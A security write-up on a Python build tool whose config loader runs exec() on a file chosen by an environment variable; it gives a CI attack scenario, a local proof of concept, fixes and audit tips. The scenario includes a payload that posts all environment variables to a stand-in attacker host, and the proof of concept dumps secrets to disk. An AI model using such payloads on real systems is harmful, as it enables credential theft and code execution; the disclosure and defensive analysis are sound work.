---
title: "RCE via exec() in a Config Loader: When Your Build System Trusts Too Much"
date: 2026-03-23 00:00:00 +0300
categories: [write-up, source-code-analysis]
tags: [python, rce, code-injection, supply-chain, source-code-analysis]
---

I was auditing a Python project — a build/automation tool used in CI/CD pipelines — when I found something that made me close my other tabs and sit up straight.

The tool had a config loading function. Simple concept: read a Python config file, extract the settings, return them as a dict. The kind of utility function that exists in thousands of projects. Except this one used `exec()` to do it. And the file path came from user input.

That's not a code smell. That's a loaded weapon.

---

## The Vulnerable Code

Deep inside the project's utility module, a function that loads configuration:

```python
def load_config(config_path):
    """Load configuration from a Python file."""
    config = {}
    with open(config_path) as f:
        exec(f.read(), config)  # ← the entire file, executed
    return config
```

And the caller:

```python
import os

config_file = os.environ.get("APP_CONFIG", "config/default.py")
settings = load_config(config_file)
```

Let me explain what happens here:

1. The config file path comes from an **environment variable** — user-controllable
2. The function opens that file and reads **all of its content**
3. The entire content is passed to `exec()` — not parsed, not validated, **executed**
4. Whatever is in that file runs with full Python privileges

This isn't `exec()` on a single line with a `startswith` check. This is `exec()` on an entire file, with the file path controlled by the user. There is no sanitization anywhere in the chain.

---

## Why This Is Different

You've probably seen write-ups about `exec()` in `setup.py` version parsers — functions that read `__version__` from `__init__.py`. Those are bad practice, but they require repo access to exploit. The attacker needs to modify a file inside the project.

This is fundamentally different:

- **The file path is external input.** The attacker doesn't need to touch the repository. They control *which file* gets executed.
- **The entire file is executed.** Not a single line, not a parsed value — the full contents of a file chosen by the attacker.
- **It runs at application startup.** Not during installation, during *runtime*. Every time the tool starts, it exec()s whatever file the environment variable points to.

In a CI/CD context — where this tool is typically used — environment variables are often set by pipeline configs, which are often stored in repos that more people have access to than the main codebase.

---

## Attack Scenario

**The setup:** A development team uses this tool in their CI/CD pipeline. The tool reads its config from `APP_CONFIG` environment variable, which is set in the pipeline YAML:

```yaml
# .github/workflows/build.yml
env:
  APP_CONFIG: config/production.py
```

**The attack:**

**Step 1** — Attacker gains write access to the pipeline config. This is a lower bar than it sounds — many teams store CI configs in repos where junior developers, contractors, or even external contributors can submit PRs.

**Step 2** — Attacker modifies the environment variable to point to a file they control:

```yaml
env:
  APP_CONFIG: /tmp/legit_looking_config.py
```

Or, if they can write to the repo:

```yaml
env:
  APP_CONFIG: config/production.py
```

Where `config/production.py` now contains:

```python
# Normal-looking config at the top
DATABASE_HOST = "db.internal.company.com"
DATABASE_PORT = 5432
DEBUG = False
LOG_LEVEL = "INFO"

# Payload buried at line 47
import subprocess, os, json
env_data = {k: v for k, v in os.environ.items()}
subprocess.run(["curl", "-X", "POST", "https://attacker.com/collect",
    "-d", json.dumps(env_data)], capture_output=True)
```

**Step 3** — Pipeline runs. The tool loads the config. `exec()` executes the entire file. The first four lines set legitimate config values. Line 47 exfiltrates every environment variable — including `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `DATABASE_PASSWORD`, and whatever else lives in that CI environment.

**Step 4** — The tool starts normally. Config values are correct. Logs look clean. The pipeline shows green. The attacker has the keys.

---

## PoC

**Environment**

```
Python   == 3.13.1
OS       == Windows 10
```

**Step 1 — Create a malicious config file** (`evil_config.py`):

```python
# Looks like a normal config file
APP_NAME = "production-api"
DEBUG = False
PORT = 8080

# Line 6: payload
import os
with open("C:/PWNED.txt", "w") as f:
    f.write("RCE SUCCESS\n")
    f.write(f"User: {os.getlogin()}\n")
    f.write(f"CWD: {os.getcwd()}\n")
    f.write("Environment:\n")
    for k, v in os.environ.items():
        f.write(f"  {k}={v}\n")
```

**Step 2 — Simulate the vulnerable config loader** (`poc.py`):

```python
import os

def load_config(config_path):
    config = {}
    with open(config_path) as f:
        exec(f.read(), config)
    return config

# Simulates: config_file = os.environ.get("APP_CONFIG", "default.py")
config_file = "evil_config.py"  # attacker-controlled path

settings = load_config(config_file)
print(f"[app] Loaded config: APP_NAME={settings.get('APP_NAME')}, PORT={settings.get('PORT')}")
print("[app] Application starting normally...")
```

**Step 3 — Run it:**

```
python poc.py
```

**Output:**

```
[app] Loaded config: APP_NAME=production-api, PORT=8080
[app] Application starting normally...
```

Everything looks normal. The app loaded its config and started. But check `C:/PWNED.txt`:

```
RCE SUCCESS
User: Monster
CWD: C:\Users\Monster\projects\tool
Environment:
  AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
  GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx
  DATABASE_URL=postgres://admin:password@db.internal:5432/prod
  ...
```

Config loaded correctly. Application running. Environment dumped to disk. No errors. No warnings. No trace in the application logs.

---

## The Fix

**Option A — Use a safe parser:**

```python
import ast

def load_config(config_path):
    config = {}
    with open(config_path) as f:
        for line in f:
            line = line.strip()
            if '=' in line and not line.startswith('#'):
                key, value = line.split('=', 1)
                key = key.strip()
                value = value.strip()
                try:
                    config[key] = ast.literal_eval(value)
                except (ValueError, SyntaxError):
                    config[key] = value
    return config
```

**Option B — Use a non-executable config format:**

```python
import json

def load_config(config_path):
    with open(config_path) as f:
        return json.load(f)
```

**Option C — If you must use Python config files, restrict the path:**

```python
import os

ALLOWED_CONFIG_DIR = "/etc/app/configs/"

def load_config(config_path):
    real_path = os.path.realpath(config_path)
    if not real_path.startswith(ALLOWED_CONFIG_DIR):
        raise ValueError(f"Config path {config_path} is outside allowed directory")
    # ... still don't use exec() though
```

The point is: reading configuration and executing code are different operations. `exec()` doesn't know the difference. Your code should.

---

## What to Look For When Auditing

This class of vulnerability follows a simple pattern: **user-controlled input reaches `exec()` or `eval()`**. When you're reviewing code, trace the data flow:

**Where does the file path come from?** Environment variable? CLI argument? HTTP parameter? Database field? If any of these are influenced by someone other than the system admin, you have a problem.

**What gets executed?** A single line with a prefix check is bad. An entire file is worse. A file downloaded from a URL is catastrophic.

**What context does it run in?** A developer's laptop is one thing. A CI/CD runner with access to deployment secrets, cloud credentials, and production databases is another. The blast radius matters.

**Is exec() even necessary?** In every case I've seen, the answer is no. `json.load()`, `yaml.safe_load()`, `configparser`, `ast.literal_eval()`, or plain string parsing can do the job. If someone tells you "we need `exec()` for flexibility," what they're really saying is "we need arbitrary code execution for convenience." Those are not the same thing.

---

## References

- **CWE-94**: Improper Control of Generation of Code — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/94.html)
- **CWE-95**: Improper Neutralization of Directives in Dynamically Evaluated Code — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/95.html)
- **OWASP Code Injection**: [owasp.org](https://owasp.org/www-community/attacks/Code_Injection)

---

## Disclosure

This vulnerability was reported through a responsible disclosure program and validated by the maintainers.

![Bounty Proof](/assets/img/bounty4.png)

---

Python `3.13.1` | March 2026
